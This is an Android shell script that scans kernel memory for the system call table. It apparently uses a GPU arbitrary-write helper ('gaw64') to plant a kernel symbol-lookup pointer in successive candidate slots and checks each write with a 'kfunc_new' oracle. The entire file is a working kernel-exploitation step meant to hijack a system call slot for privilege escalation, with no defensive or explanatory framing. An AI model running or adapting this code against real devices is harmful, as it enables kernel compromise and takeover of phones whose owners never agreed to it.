#!/system/bin/sh
# SPDX-License-Identifier: MIT
# Safe scan: every gaw64 call has a timeout, so a wedged GPU can't hang forever.
# Oracle: write KLN pointer to candidate slot; `kfunc_new sym memcpy` returns a
# real kernel address if slot 244 landed in sys_call_table, else -1.
D=/data/local/tmp
GW=$D/gaw64
KF=$D/kfunc_new
KLN=ffffffc00111e5d0
LOG=$D/scan2.log
START=2092000
END=21cd000

: > $LOG
cur=$START
while [ $((16#$cur)) -lt $((16#$END)) ]; do
  P=$(printf '%x' $((0x$cur + 0x7a0)))
  timeout 10 $GW $P $KLN >/dev/null 2>&1
  RC=$?
  if [ $RC -ne 0 ]; then
    echo "GPU timeout at $cur (rc=$RC) - abort" >> $LOG
    exit 4
  fi
  R=$(timeout 8 $KF sym memcpy 2>/dev/null | tail -1)
  echo "$cur -> $R" >> $LOG
  case "$R" in
    *memcpy*=0xffffffffffffffff*) ;;
    *memcpy*=0x*)
      A=$(echo "$R" | sed 's/.*=0x\([0-9a-f]*\).*/\1/')
      echo "HIT slot=$P memcpy=0x$A" >> $LOG
      echo "HIT slot=$P memcpy=0x$A"
      exit 0
      ;;
    '') echo "DEAD at $cur" >> $LOG; exit 3;;
  esac
  cur=$(printf '%x' $((0x$cur + 0x1000)))
done
echo "DONE no hit" >> $LOG
echo "DONE no hit"
exit 2
